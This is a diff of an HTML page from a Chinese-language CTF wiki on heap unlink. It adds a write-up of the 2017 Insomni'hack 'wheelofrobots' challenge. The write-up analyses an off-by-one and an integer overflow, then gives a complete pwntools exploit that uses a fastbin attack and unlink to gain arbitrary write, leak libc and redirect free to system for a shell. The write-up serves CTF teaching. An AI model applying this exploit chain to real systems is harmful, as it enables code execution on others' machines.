@@ -722,17 +722,221 @@ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
 </div>
 </div>
 </div>
+<div class="section" id="insomni-hack-wheelofrobots">
+<h2>2017 insomni’hack wheelofrobots<a class="headerlink" href="#insomni-hack-wheelofrobots" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id11">
-<h2>题目<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h2>
+<h3>基本信息<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
+<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2017_insomni&#39;hack_wheelofrobots git:(master) file wheelofrobots
+wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped
+➜  2017_insomni&#39;hack_wheelofrobots git:(master) checksec wheelofrobots
+[*] &quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni&#39;hack_wheelofrobots/wheelofrobots&quot;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre></div>
+</div>
+<p>动态链接64位，主要开启了 canary 保护与 nx 保护。</p>
+</div>
+<div class="section" id="id12">
+<h3>基本功能<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
+<p>大概分析程序，可以得知，这是一个配置机器人轮子的游戏，机器人一共需要添加 3 个轮子。</p>
+<p>程序非常依赖的一个功能是读取整数，该函数read_num是读取指定的长度，将其转化为 int 类型的数字。</p>
+<p>具体功能如下</p>
 <ul class="simple">
-<li><a class="reference external" href="https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a">Insomni’hack 2017-Wheel of Robots</a></li>
+<li>添加轮子，一共有 6 个轮子可以选择。选择轮子时使用函数是read_num，然而该函数在读取的时候<code class="docutils literal"><span class="pre">read_num((char</span> <span class="pre">*)&amp;choice,</span> <span class="pre">5uLL);</span></code> 读取的长度是 5 个字节，恰好覆盖了 bender_inuse 的最低字节，即构成了
+off-by-one 漏洞。与此同时，在添加 Destructor 轮子的时候，并没有进行大小检测。如果读取的数为负数，那么在申请<code class="docutils literal"><span class="pre">calloc(1uLL,</span> <span class="pre">20</span> <span class="pre">*</span> <span class="pre">v5);</span></code> 时就可能导致 <code class="docutils literal"><span class="pre">20*v5</span></code> 溢出，但与此同时，
+<code class="docutils literal"><span class="pre">destructor_size</span> <span class="pre">=</span> <span class="pre">v5</span></code> 仍然会很大。</li>
+<li>移除轮子，直接将相应轮子移除，但是并没有将其对应的指针设置为 NULL ，其对应的大小也没有清空。</li>
+<li>修改轮子名字，这个是根据当时申请的轮子的大小空间来读取数据。之前我们已经说过 destructor 轮子读取大小时，并没有检测负数的情况，所以在进行如下操作时
+<code class="docutils literal"><span class="pre">result</span> <span class="pre">=</span> <span class="pre">read(0,</span> <span class="pre">destructor,</span> <span class="pre">20</span> <span class="pre">*</span> <span class="pre">destructor_size);</span></code> ，存在几乎任意长度溢出的漏洞。</li>
+<li>启动机器人，在启动的时候会随机地输出一些轮子的名称，这个是我们难以控制的。</li>
+</ul>
+<p>综上分析，我们可以知道的是，该程序主要存在的漏洞 off-by-one 与整数溢出。这里我们主要使用前面的off-by-one 漏洞。</p>
+</div>
+<div class="section" id="id13">
+<h3>利用思路<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
+<p>基本利用思路如下</p>
+<ol class="arabic simple">
+<li>利用 off by one 漏洞与 fastbin attack 分配 chunk 到 0x603138，进而可以控制 <code class="docutils literal"><span class="pre">destructor_size</span></code>的大小，从而实现任意长度堆溢出。这里我们将轮子1 tinny 分配到这里。</li>
+<li>分别分配合适大小的物理相邻的 chunk，其中包括 destructor。借助上面可以任意长度堆溢出的漏洞，对 destructor 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 0x6030E8 处 fake chunk
+进行 unlink 的效果，这时 bss 段的 destructor 指向 0x6030D0。从而，我们可以再次实现覆盖bss 段几乎所有的内容。</li>
+<li>构造一个任意地址写的漏洞。通过上述的漏洞将已经分配的轮子1 tinny 指针覆盖为 destructor 的地址，那么此后编辑 tinny 即在编辑 destructor 的内容，进而当我们再次编辑 destructor 时就相当于任意低地址写。</li>
+<li>由于程序只是在最后启动机器人的时候，才会随机输出一些轮子的内容，并且一旦输出，程序就会退出，由于这部分我们并不能控制，所以我们将 <code class="docutils literal"><span class="pre">exit()</span></code> patch 为一个 <code class="docutils literal"><span class="pre">ret</span></code>
+地址。这样的话，我们就可以多次输出内容了，从而可以泄漏一些 got 表地址。<strong>其实，既然我们有了任意地址写的漏洞，我们也可以将某个 got 写为 puts 的 plt
+地址，进而调用相应函数时便可以直接将相应内容输出。但是这里并不去采用这种方法，因为之前已经在 hitcon stkof 中用过这种手法了。</strong></li>
+<li>在泄漏了相应的内容后，我们便可以得到 libc 基地址，system 地址，libc中的 /bin/sh 地址。进而我们修改 <a class="reference external" href="mailto:free&#37;&#52;&#48;got">free<span>&#64;</span>got</a> 为 system 地址。从而当再次释放某块内存时，便可以启动shell。</li>
+</ol>
+<p>代码如下</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./wheelofrobots&quot;</span>
+<span class="n">robots</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./wheelofrobots&#39;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./wheelofrobots&quot;</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">offset_bin_main_arena</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">word_bytes</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">/</span> <span class="mi">8</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mi">4</span>  <span class="c1"># lock</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">4</span>  <span class="c1"># flags</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">10</span>  <span class="c1"># offset fastbin</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># top,last_remainder</span>
+    <span class="n">offset</span> <span class="o">+=</span> <span class="n">idx</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">word_bytes</span>  <span class="c1"># idx</span>
+    <span class="n">offset</span> <span class="o">-=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># bin overlap</span>
+    <span class="k">return</span> <span class="n">offset</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">idx</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Increase Bender&#39;s intelligence: &quot;</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">idx</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Increase Robot Devil&#39;s cruelty: &quot;</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">idx</span> <span class="o">==</span> <span class="mi">6</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Increase Destructor&#39;s powerful: &quot;</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Robot&#39;s name: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">start_robot</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">overflow_benderinuse</span><span class="p">(</span><span class="n">inuse</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;9999&#39;</span> <span class="o">+</span> <span class="n">inuse</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
+    <span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
+    <span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">what</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="nb">print</span> <span class="s2">&quot;step 1&quot;</span>
+    <span class="c1"># add a fastbin chunk 0x20 and free it</span>
+    <span class="c1"># so it is in fastbin, idx2-&gt;NULL</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1"># idx2</span>
+    <span class="n">remove</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="c1"># overflow bender inuse with 1</span>
+    <span class="n">overflow_benderinuse</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="c1"># change bender&#39;s fd to 0x603138, point to bender&#39;s size</span>
+    <span class="c1"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span>
+    <span class="n">change</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603138</span><span class="p">))</span>
+    <span class="c1"># in order add bender again</span>
+    <span class="n">overflow_benderinuse</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="c1"># add bender again, fastbin 0x603138-&gt;NULL</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="c1"># in order to malloc chunk at 0x603138</span>
+    <span class="c1"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span>
+    <span class="c1"># it is at Robot Devil</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
+    <span class="c1"># trigger malloc, set tinny point to 0x603148</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="c1"># wheels must &lt;= 3</span>
+    <span class="n">remove</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">remove</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+    <span class="nb">print</span> <span class="s1">&#39;step 2&#39;</span>
+    <span class="c1"># alloc Destructor size 60-&gt;0x50, chunk content 0x40</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="c1"># alloc devil, size=20*7=140, bigger than fastbin</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
+    <span class="c1"># edit destructor&#39;s size to 1000 by tinny</span>
+    <span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>
+    <span class="c1"># place fake chunk at destructor&#39;s pointer</span>
+    <span class="n">fakechunk_addr</span> <span class="o">=</span> <span class="mh">0x6030E8</span>
+    <span class="n">fakechunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_addr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
+        <span class="n">fakechunk_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+    <span class="n">fakechunk</span> <span class="o">=</span> <span class="n">fakechunk</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
+    <span class="n">fakechunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span>
+    <span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">fakechunk</span><span class="p">)</span>
+    <span class="c1"># trigger unlink</span>
+    <span class="n">remove</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+    <span class="nb">print</span> <span class="s1">&#39;step 3&#39;</span>
+    <span class="c1"># make 0x6030F8 point to 0x6030E8</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6030E8</span><span class="p">)</span>
+    <span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+    <span class="nb">print</span> <span class="s1">&#39;step 4&#39;</span>
+    <span class="c1"># make exit just as return</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">robots</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">],</span> <span class="mh">0x401954</span><span class="p">)</span>
+
+    <span class="nb">print</span> <span class="s1">&#39;step 5&#39;</span>
+    <span class="c1"># set wheel cnt =3, 0x603130 in order to start robot</span>
+    <span class="n">write</span><span class="p">(</span><span class="mh">0x603130</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="c1"># set destructor point to puts@got</span>
+    <span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">robots</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>
+    <span class="n">start_robot</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;New hands great!! Thx &#39;</span><span class="p">)</span>
+    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
+
+    <span class="c1"># make free-&gt;system</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">robots</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">],</span> <span class="n">system_addr</span><span class="p">)</span>
+    <span class="c1"># make destructor point to /bin/sh addr</span>
+    <span class="n">write</span><span class="p">(</span><span class="mh">0x6030E8</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">)</span>
+    <span class="c1"># get shell</span>
+    <span class="n">remove</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">pass</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">exp</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="id14">
+<h2>题目<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
 <li><a class="reference external" href="https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl">DEFCON 2017 Qualifiers beatmeonthedl</a></li>
 </ul>
 </div>
-<div class="section" id="id12">
-<h2>参考<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id15">
+<h2>参考<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h2>
 <ul class="simple">
 <li><a class="reference external" href="mailto:malloc&#37;&#52;&#48;angelboy">malloc<span>&#64;</span>angelboy</a></li>
+<li><a class="reference external" href="https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a">https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a</a></li>
 </ul>
 </div>
 </div>
@@ -837,8 +1041,14 @@ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
 </li>
 </ul>
 </li>
-<li class="toctree-l3"><a class="reference internal" href="#id11">题目</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id12">参考</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#insomni-hack-wheelofrobots">2017 insomni’hack wheelofrobots</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id11">基本信息</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id12">基本功能</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id13">利用思路</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id14">题目</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id15">参考</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="use_after_free.html">Use After Free</a></li>
